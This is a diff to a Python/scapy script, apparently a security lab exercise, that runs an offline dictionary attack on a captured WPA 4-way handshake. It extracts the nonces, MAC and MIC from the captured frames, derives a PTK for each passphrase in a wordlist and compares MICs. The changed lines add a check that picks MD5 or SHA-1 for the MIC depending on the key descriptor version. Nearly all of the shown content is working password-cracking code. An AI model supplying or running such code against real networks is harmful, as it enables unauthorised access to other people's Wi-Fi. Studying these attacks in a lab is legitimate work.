@@ -33,6 +33,13 @@ Clientmac = a2b_hex(wpa[2].addr2.replace(':', ''))      # "0013efd015bd"
 ANonce = wpa[5].getlayer(WPA_key).nonce                 # 90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91
 SNonce = raw(wpa[6])[65:-72]                            # 7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577
 
+# if key_desciptor = 2 we use SHA-1 for the MIC and if key_desciptor = 1 we use MD5 
+key_information = raw(wpa[8])[54:55]
+mask = 0b00000111
+key_descriptor = int.from_bytes(key_information, "big") & mask
+
+print("test : ", key_descriptor) 
+
 # This is the MIC contained in the 4th frame of the 4-way handshake
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
 mic_to_test = raw(wpa[8])[-18:-2].hex()                 # "36eef66540fa801ceee2fea9b7929b40"
@@ -63,7 +70,10 @@ with open('wordlist.txt','r') as file:
             ptk = customPRF512(pmk,str.encode(A),B)
 
             #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-            mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+            if(key_descriptor == 1): 
+                mic = hmac.new(ptk[0:16],data,hashlib.md5) 
+            else: 
+                mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
             print ("MIC:\t\t",mic.hexdigest(),"\n", passPhrase)
             if(mic.hexdigest()[0:32] == mic_to_test):
